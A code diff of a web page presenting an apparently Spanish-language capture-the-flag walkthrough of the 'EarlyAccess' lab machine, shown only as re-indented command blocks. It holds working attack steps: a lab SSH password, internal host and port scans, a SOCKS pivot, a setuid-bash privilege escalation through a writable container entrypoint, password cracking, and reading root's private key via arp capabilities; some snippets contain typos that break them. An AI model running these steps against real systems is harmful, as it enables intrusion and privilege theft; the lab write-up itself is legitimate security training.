-          drew@earlyacccess:~$ cat user.txt
-          **************************
+sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110
+drew@earlyacccess:~$ ls
+user.txt
+drew@earlyacccess:~$ cat user.txt
+**************************
         `}
       />
       <Paragraph>
@@ -976,9 +979,9 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-adm@earlyaccess:/$ getcap -r / 2>/dev/null
-          /usr/sbin/arp =ep
-          /usr/bin/ping = cap_net_raw+ep
+game-adm@earlyaccess:/$ getcap -r / 2>/dev/null
+/usr/sbin/arp =ep
+/usr/bin/ping = cap_net_raw+ep
         `}
       />
       <Paragraph>
@@ -987,8 +990,8 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-adm@earlyaccess:/$ ls -l /usr/sbin/arp
-          -rwxr-x--- 1 root  adm 67512 Sep 24 2018 /usr/sbin/arp
+game-adm@earlyaccess:/$ ls -l /usr/sbin/arp
+-rwxr-x--- 1 root  adm 67512 Sep 24 2018 /usr/sbin/arp
         `}
       />
       <SubTitle>
@@ -1005,15 +1008,15 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          #!/bin/bash
-          networks=$(hostname -I)
-          
-          for net in $\{networks[@]}; do
-            echo -e "\\n[+] Escaneando el puerto $net.0/22:\\n"
-            for i in $(seg 1 254); do
-                timeout 1 bash -c  "ping -c 1 $network.$i" &>/dev/null && echo -e "[+] Host: $network.$i - Open" &
-            done; wait
-          done
+#!/bin/bash
+networks=$(hostname -I)
+
+for net in $\{networks[@]}; do
+  echo -e "\\n[+] Escaneando el puerto $net.0/22:\\n"
+  for i in $(seg 1 254); do
+      timeout 1 bash -c  "ping -c 1 $network.$i" &>/dev/null && echo -e "[+] Host: $network.$i - Open" &
+  done; wait
+done
         `}
       />
       <Paragraph>
@@ -1021,18 +1024,18 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          #!/bin/bash
-          hostnames=(172.18.0.100 172.18.0.101 172.18.0.102 172.18.0.2 172.19.0.2 172.19.0.3)
-          
-          for host in $\{hostnames[@]}; do
-            timeout 1 bash -c  "echo '' > /dev/tcp/$host/22" 2>/dev/null && echo "[+] Puerto 22 esta abierto en $host"
-          done
+#!/bin/bash
+hostnames=(172.18.0.100 172.18.0.101 172.18.0.102 172.18.0.2 172.19.0.2 172.19.0.3)
+
+for host in $\{hostnames[@]}; do
+  timeout 1 bash -c  "echo '' > /dev/tcp/$host/22" 2>/dev/null && echo "[+] Puerto 22 esta abierto en $host"
+done
         `}
       />
       <Highlighter
         text={`
-          drew@earlyacccess:/tmp$ ./port22Open.sh
-          [+] Puerto 22 esta abierto en 172.19.0.3
+drew@earlyacccess:/tmp$ ./port22Open.sh
+[+] Puerto 22 esta abierto en 172.19.0.3
         `}
       />
       <Paragraph>
@@ -1040,7 +1043,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          drew@earlyacccess:~/.ssh$ ssh game-tester@172.19.0.3 
+drew@earlyacccess:~/.ssh$ ssh game-tester@172.19.0.3 
         `}
       />
       <Paragraph>
@@ -1049,10 +1052,10 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-tester@game-server:/$ ss -nltp
-          ...
-          LISTEN  0   128   *:9999  *:*
-          ... 
+game-tester@game-server:/$ ss -nltp
+...
+LISTEN  0   128   *:9999  *:*
+... 
         `}
       />
       <Paragraph>
@@ -1061,7 +1064,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110 -D 1080
+sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110 -D 1080
         `}
       />
       <Paragraph>
@@ -1084,15 +1087,15 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-tester@game-server:/$ cat entrypoint.sh
-          #!/bin/bash
-          for ep in /docker-entrypoint.d/*; do
-            if [ -x "$(ep)" ]; then
-              echo "Running: \${ep}"
-              "\${ep}" &
-            fi
-          done
-          tail -f /dev/null
+game-tester@game-server:/$ cat entrypoint.sh
+#!/bin/bash
+for ep in /docker-entrypoint.d/*; do
+  if [ -x "$(ep)" ]; then
+    echo "Running: \${ep}"
+    "\${ep}" &
+  fi
+done
+tail -f /dev/null
         `}
       />
       <Paragraph>
@@ -1100,14 +1103,14 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-tester@game-server:/$ cat node-server.sh
-          service ssh start
+game-tester@game-server:/$ cat node-server.sh
+service ssh start
 
-          cd /usr/src/app
+cd /usr/src/app
 
-          # Install dependencies
-          npm install
-          sudo -u node node server.js
+# Install dependencies
+npm install
+sudo -u node node server.js
         `}
       />
       <Paragraph>
@@ -1116,8 +1119,8 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-           find \\-name node-server.sh 2>/dev/null
-           ./opt/docker-entrypoint.d/node-server.sh
+find \\-name node-server.sh 2>/dev/null
+./opt/docker-entrypoint.d/node-server.sh
         `}
       />
       <Paragraph>
@@ -1126,7 +1129,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          drew@earlyaccess:/$ while true; do echo "chmod u+s /bin/bash" > /opt/docker-entrypoint/miscript.sh; chmod +x /opt/docker-entrypoint/miscript.sh;sleep 1; done
+drew@earlyaccess:/$ while true; do echo "chmod u+s /bin/bash" > /opt/docker-entrypoint/miscript.sh; chmod +x /opt/docker-entrypoint/miscript.sh;sleep 1; done
         `}
       />
        <Paragraph>
@@ -1134,10 +1137,10 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-tester@game-server:/$ curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'
-          Connection to 172.19.0.3 closed by remote host.
-          Connection to 172.19.0.3 closed.
-          drew@earlyaccess:~/.shh
+game-tester@game-server:/$ curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'
+Connection to 172.19.0.3 closed by remote host.
+Connection to 172.19.0.3 closed.
+drew@earlyaccess:~/.shh
         `}
       />
       <Paragraph>
@@ -1145,13 +1148,13 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          -bash-4.4$ cd /docker-entrypoint.d/
-          -bash-4.4$ ls
-          miscript.sh node-server.sh
-          -bash-4.4$ bash -p
-          bash-4.4# whoami
-          root
-          bash-4.4#
+-bash-4.4$ cd /docker-entrypoint.d/
+-bash-4.4$ ls
+miscript.sh node-server.sh
+-bash-4.4$ bash -p
+bash-4.4# whoami
+root
+bash-4.4#
         `}
       />
       <Paragraph>
@@ -1160,10 +1163,10 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
-          ...
-          gamemaster (game-adm)
-          ...
+jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
+...
+gamemaster (game-adm)
+...
         `}
       />
       <Paragraph>
@@ -1174,15 +1177,15 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          game-adm@earlyaccess:/home$ LFILE=/root/.ssh/id_rsa
-          game-adm@earlyaccess:/home$ /usr/sbin/arp -v -f $LFILE 2>&1 | grep -Ev "format|cannot|Unknown host" | sed 's/>> //' >/tmp/id_rsa
-          game-adm@earlyaccess:/home$ chmod 600 /tmp/id_rsa
-          game-adm@earlyaccess:/tmp$ ssh -i id_rsa root@localhost
-          root@earlyaccess:~# cd /root
-          root@earlyaccess:~# ls
-          app root.txt
-          root@earlyaccess:~# cat root.txt
-          ******************
+game-adm@earlyaccess:/home$ LFILE=/root/.ssh/id_rsa
+game-adm@earlyaccess:/home$ /usr/sbin/arp -v -f $LFILE 2>&1 | grep -Ev "format|cannot|Unknown host" | sed 's/>> //' >/tmp/id_rsa
+game-adm@earlyaccess:/home$ chmod 600 /tmp/id_rsa
+game-adm@earlyaccess:/tmp$ ssh -i id_rsa root@localhost
+root@earlyaccess:~# cd /root
+root@earlyaccess:~# ls
+app root.txt
+root@earlyaccess:~# cat root.txt
+******************
         `}
       />
     </ContentBlock>
